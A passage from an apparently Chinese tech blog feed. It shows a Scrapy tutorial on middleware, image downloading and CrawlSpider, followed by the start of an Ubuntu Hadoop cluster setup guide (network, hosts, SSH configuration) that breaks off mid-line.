class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Move4567KanItem</span>(scrapy.Item):</span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    details = scrapy.Field()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pipelines.py 打印输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Move4567KanPipeline</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><p>作用</p><pre><code>拦截请求和响应</code></pre><p>爬虫中间件</p><pre><code>略</code></pre><p>下载中间件(推荐)</p><pre><code>拦截请求:        1.篡改请求url    2.伪装请求头信息:        UA        Cookie    3.设置请求代理拦截响应:    篡改响应数据</code></pre><p>改写中间件文件 middlewares.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> signals</span><br><span class="line"><span class="keyword">from</span> itemadapter <span class="keyword">import</span> is_item, ItemAdapter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MiddleDownloaderMiddleware</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拦截所有请求</span></span><br><span class="line">    <span class="comment"># request就是拦截到的请求,spider就是爬虫类实例化的对象</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是process_request()&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拦截所有响应对象</span></span><br><span class="line">    <span class="comment"># request就是response响应对象对应的请求对象,response就是拦截到的响应对象</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_response</span>(<span class="params">self, request, response, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是process_response()&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拦截异常请求</span></span><br><span class="line">    <span class="comment"># request就是拦截到的异常请求的请求对象</span></span><br><span class="line">    <span class="comment"># 作用:修正异常请求,将其 重新发送</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_exception</span>(<span class="params">self, request, exception, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是process_exception()&#x27;</span>)</span><br><span class="line">        <span class="comment"># pass</span></span><br></pre></td></tr></table></figure><p>编写爬虫文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MidSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;mid&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.baidu.com&#x27;</span>, <span class="string">&#x27;https://www.sogou.com&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在配置文件setting.py中启用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ROBOTSTXT_OBEY = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">DOWNLOADER_MIDDLEWARES = &#123;</span><br><span class="line">    <span class="string">&#x27;middle.middlewares.MiddleDownloaderMiddleware&#x27;</span>: <span class="number">543</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启动工程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro middle %scrapy crawl mid</span><br><span class="line">我是process_request()</span><br><span class="line">我是process_request()</span><br><span class="line">我是process_response()</span><br><span class="line">我是process_exception()</span><br><span class="line">我是process_response()</span><br><span class="line">我是process_exception()</span><br></pre></td></tr></table></figure><p>process_exception()方法设置代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拦截异常请求</span></span><br><span class="line"><span class="comment"># request就是拦截到的异常请求的请求对象</span></span><br><span class="line"><span class="comment"># 作用:修正异常请求,将其 重新发送</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_exception</span>(<span class="params">self, request, exception, spider</span>):</span><br><span class="line">    <span class="comment"># 请求的ip被禁,该请求就会变成一个异常请求,加入代理</span></span><br><span class="line">    request.meta[<span class="string">&#x27;proxy_&#x27;</span>] = <span class="string">&#x27;https://ip:port&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我是process_exception()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将异常的请求修正后重新发送</span></span><br><span class="line">    <span class="keyword">return</span> request</span><br><span class="line">    <span class="comment"># 可能会造成死循环,因为如果加入代理后依旧发生异常,会再次加入代理去请求</span></span><br></pre></td></tr></table></figure><p>process_request()方法设置headers</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request, spider</span>):</span><br><span class="line">    <span class="comment"># 设置请求头,但一般不这么写,可以在setting.py中设置全局</span></span><br><span class="line">    request.headers[<span class="string">&#x27;User-Agent&#x27;</span>] = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    request.headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我是process_request()&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>process_response()方法篡改响应数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拦截所有响应对象</span></span><br><span class="line"><span class="comment"># request就是response响应对象对应的请求对象,response就是拦截到的响应对象</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_response</span>(<span class="params">self, request, response, spider</span>):</span><br><span class="line">    <span class="comment"># 篡改响应数据</span></span><br><span class="line">    response.text = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;我是process_response()&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure><h2 id="大文件下载-爬取jdlingyu-com图片"><a href="#大文件下载-爬取jdlingyu-com图片" class="headerlink" title="大文件下载-爬取jdlingyu.com图片"></a>大文件下载-爬取jdlingyu.com图片</h2><p>文件目录</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151342799.png?token=ARYCSAQF2H5ORVGMPC5ZA6TCQCJQG"></p><p>img.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> imgdownload.items <span class="keyword">import</span> ImgdownloadItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ImgSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;img&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.jdlingyu.com&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        li_list = response.xpath(<span class="string">&#x27;/html/body/div[1]/div[2]/div[1]/div/div[6]/div/div[1]/div/div[2]/ul/li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> li_list:</span><br><span class="line">            url = a.xpath(<span class="string">&#x27;./div/div[2]/h2/a/@href&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            title = a.xpath(<span class="string">&#x27;./div/div[2]/h2/a/text()&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 传递给itme</span></span><br><span class="line">            item = ImgdownloadItem()</span><br><span class="line">            item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 回调并传递参数</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=url, callback=self.get_img_url, meta=&#123;<span class="string">&#x27;item&#x27;</span>: item&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 对每个图集的url发起请求</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_img_url</span>(<span class="params">self, response</span>):</span><br><span class="line">        page = <span class="number">0</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        <span class="comment"># 抓取每张图片的下载链接</span></span><br><span class="line">        img_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;primary-home&quot;]/article/div[2]/img&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> scr <span class="keyword">in</span> img_list:</span><br><span class="line">            img_url = scr.xpath(<span class="string">&#x27;./@src&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            page += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 传递给item</span></span><br><span class="line">            item[<span class="string">&#x27;img_url&#x27;</span>] = img_url</span><br><span class="line">            item[<span class="string">&#x27;page&#x27;</span>] = page</span><br><span class="line">            <span class="comment"># 提交给管道</span></span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>setting.py增加配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">USER_AGENT = <span class="string">&#x27;ua&#x27;</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;ERROR&#x27;</span></span><br><span class="line"><span class="comment"># 图片存放目录</span></span><br><span class="line">IMAGES_STORE = <span class="string">&#x27;./imgs&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>items.py增加字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ImgdownloadItem</span>(scrapy.Item):</span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    img_url = scrapy.Field()</span><br><span class="line">    page = scrapy.Field()</span><br></pre></td></tr></table></figure><p>pipelines.py增加管道类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> itemadapter <span class="keyword">import</span> ItemAdapter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认管道类无法请求图片数据</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ImgdownloadPipeline</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 接受图片地址和title,然后对其进行请求存储到本地</span></span><br><span class="line"><span class="comment"># 提供了数据下载功能,也可以下载视频和音频</span></span><br><span class="line"><span class="keyword">from</span> scrapy.pipelines.images <span class="keyword">import</span> ImagesPipeline</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承ImagesPipeline类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">img_download</span>(<span class="title class_ inherited__">ImagesPipeline</span>):</span><br><span class="line">    <span class="comment"># 重写三个父类方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_media_requests</span>(<span class="params">self, item, info</span>):</span><br><span class="line">        <span class="comment"># 下载,并传参,如果传递整个item,最后只会下载一张图片,原因未知</span></span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request(url=item[<span class="string">&#x27;img_url&#x27;</span>], meta=&#123;<span class="string">&#x27;title&#x27;</span>: item[<span class="string">&#x27;title&#x27;</span>], <span class="string">&#x27;page&#x27;</span>: item[<span class="string">&#x27;page&#x27;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 返回图片保存路径</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">file_path</span>(<span class="params">self, request, response=<span class="literal">None</span>, info=<span class="literal">None</span>, *, item=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="comment"># 拼接路径</span></span><br><span class="line">        title = request.meta[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        page = request.meta[<span class="string">&#x27;page&#x27;</span>]</span><br><span class="line">        path = <span class="string">f&#x27;<span class="subst">&#123;title&#125;</span>/<span class="subst">&#123;page&#125;</span>.jpg&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 返回路径</span></span><br><span class="line">        <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将item返回给下一个即将被执行的管道类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">item_completed</span>(<span class="params">self, results, item, info</span>):</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p>setting.py增加管道类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="comment">#&#x27;imgdownload.pipelines.ImgdownloadPipeline&#x27;: 300,</span></span><br><span class="line">   <span class="string">&#x27;imgdownload.pipelines.img_download&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151342947.png?token=ARYCSATQHIG5XPI3W7VHBBTCQCJR2"></p><h2 id="CrawlSpider-深度爬取"><a href="#CrawlSpider-深度爬取" class="headerlink" title="CrawlSpider 深度爬取"></a>CrawlSpider 深度爬取</h2><p>是什么</p><pre><code>是Spider的一个子类,也就是爬虫文件的父类</code></pre><p>作用:用作于全站数据的爬取</p><pre><code>将一个页面下所有的页码进行爬取</code></pre><p>基本使用</p><pre><code>1.创建一个工程2.创建一个基于CrawlSpider类的爬虫文件    crapy genspider -t crawl main www.xxx.com3.执行工程</code></pre><p>编写工程文件main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> scrapy.linkextractors <span class="keyword">import</span> LinkExtractor</span><br><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> CrawlSpider, Rule</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainSpider</span>(<span class="title class_ inherited__">CrawlSpider</span>):</span><br><span class="line">    name = <span class="string">&#x27;main&#x27;</span></span><br><span class="line">    <span class="comment">#allowed_domains = [&#x27;https://www.mn52.com/&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.mn52.com/fj/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 链接提取器,根据allow里的正则来提取url</span></span><br><span class="line">    rules = (</span><br><span class="line">        <span class="comment"># 对提取的url发起请求,然后回调解析</span></span><br><span class="line">        <span class="comment"># 如果allow为空 将抓取此页面下的链接</span></span><br><span class="line">        Rule(LinkExtractor(allow=<span class="string">r&#x27;list_8_\d.html&#x27;</span>), callback=<span class="string">&#x27;parse_item&#x27;</span>, follow=<span class="literal">True</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_item</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        item = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行工程</p><pre><code>可以看到抓取了所有页码的url</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro crawl %scrapy crawl main</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_2.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_3.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_4.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_8.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_5.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_7.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_9.html&gt;</span><br><span class="line">&lt;200 https://www.mn52.com/fj/list_8_6.html&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;创建项目&quot;&gt;&lt;a href=&quot;#创建项目&quot; class=&quot;headerlink&quot; title=&quot;创建项目&quot;&gt;&lt;/a&gt;创建项目&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scrapy startproject tutorial&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&quot;创建任务&quot;&gt;&lt;a href=&quot;#创建任务&quot; class=&quot;headerlink&quot; title=&quot;创建任务&quot;&gt;&lt;/a&gt;创建任务&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;scrapy genspider first www.baidu.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;会生成一个first文件&lt;/p&gt;</summary>
    
    
    
    <category term="爬虫" scheme="http://example.com/categories/%E7%88%AC%E8%99%AB/"/>
    
    
    <category term="教程" scheme="http://example.com/tags/%E6%95%99%E7%A8%8B/"/>
    
    <category term="爬虫" scheme="http://example.com/tags/%E7%88%AC%E8%99%AB/"/>
    
    <category term="scrapy" scheme="http://example.com/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu下大数据集群搭建</title>
    <link href="http://example.com/2022/03/01/ubuntu%E4%B8%8Bhadoop%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2022/03/01/ubuntu%E4%B8%8Bhadoop%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/</id>
    <published>2022-03-01T14:02:18.000Z</published>
    <updated>2022-05-15T05:56:23.665Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一-配置ip-三个节点"><a href="#一-配置ip-三个节点" class="headerlink" title="一.配置ip(三个节点)"></a>一.配置ip(三个节点)</h3><p>自ubuntu17之后多了一种配置方式更加高效,也就是netplan</p><p>1.1编辑配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:/etc/netplan<span class="comment"># gedit /etc/netplan/01-network-manager-all.yaml</span></span><br></pre></td></tr></table></figure><p>配置内容如下,<code>注意缩进</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">network:</span></span><br><span class="line"> <span class="attr">version:</span> <span class="number">2</span></span><br><span class="line"> <span class="attr">renderer:</span> <span class="string">NetworkManager</span></span><br><span class="line"> <span class="attr">ethernets:</span></span><br><span class="line">    <span class="attr">ens33:</span></span><br><span class="line">      <span class="attr">dhcp4:</span> <span class="literal">no</span></span><br><span class="line">      <span class="attr">dhcp6:</span> <span class="literal">no</span></span><br><span class="line">      <span class="attr">addresses:</span> [<span class="number">192.168</span><span class="number">.10</span><span class="number">.101</span><span class="string">/24</span>]</span><br><span class="line">      <span class="attr">gateway4:</span> <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span></span><br><span class="line">      <span class="attr">nameservers:</span></span><br><span class="line">        <span class="attr">addresses:</span> [<span class="number">8.8</span><span class="number">.8</span><span class="number">.8</span>, <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>]</span><br></pre></td></tr></table></figure><p>1.2使配置生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:/etc/netplan<span class="comment"># netplan apply</span></span><br></pre></td></tr></table></figure><p>如果没有报错则配置成功</p><h3 id="二-配置主机名和主机名映射-三个节点"><a href="#二-配置主机名和主机名映射-三个节点" class="headerlink" title="二.配置主机名和主机名映射(三个节点)"></a>二.配置主机名和主机名映射(三个节点)</h3><p>1.1配置主机名并查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">重启后生效</span><br><span class="line">root@master:/etc/netplan<span class="comment"># hostnamectl set-hostname master</span></span><br><span class="line">root@master:/etc/netplan<span class="comment"># hostname</span></span><br></pre></td></tr></table></figure><p>1.2配置主机名映射</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:/etc/netplan<span class="comment"># gedit /etc/hosts</span></span><br></pre></td></tr></table></figure><p>添加以下内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">192.168.10.101 master</span><br><span class="line">192.168.10.102 slave1</span><br><span class="line">192.168.10.103 slave2</span><br></pre></td></tr></table></figure><p>1.3ping测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">有以下回显证明配置成功</span><br><span class="line">root@master:/etc/netplan<span class="comment"># ping slave2</span></span><br><span class="line">PING slave2 (192.168.10.103) 56(84) bytes of data.</span><br><span class="line">64 bytes from slave2 (192.168.10.103): icmp_seq=1 ttl=64 time=0.891 ms</span><br><span class="line">64 bytes from slave2 (192.168.10.103): icmp_seq=2 ttl=64 time=0.369 ms</span><br><span class="line">64 bytes from slave2 (192.168.10.103): icmp_seq=3 ttl=64 time=0.455 ms</span><br></pre></td></tr></table></figure><p>1.4将hosts文件分发给子节点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:/etc/netplan<span class="comment"># scp /etc/hosts root@slave1:/etc/</span></span><br><span class="line">输入<span class="built_in">yes</span>再输入密码</span><br></pre></td></tr></table></figure><h3 id="三-配置ssh免密登录-三个节点"><a href="#三-配置ssh免密登录-三个节点" class="headerlink" title="三.配置ssh免密登录(三个节点)"></a>三.配置ssh免密登录(三个节点)</h3><p>因为Ubuntu并不自带ssh服务所以要安装ssh并配置允许root远程登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">下载</span><br><span class="line">sudo apt-get install openssh-server</span><br><span class="line">启动</span><br><span class="line">sudo service ssh start</span><br><span class="line">配置</span><br><span class="line">sudo vim /etc/ssh/sshd_config</span><br><span class="line">添加一条</span><br><span class="line">PermitRootLogin <span 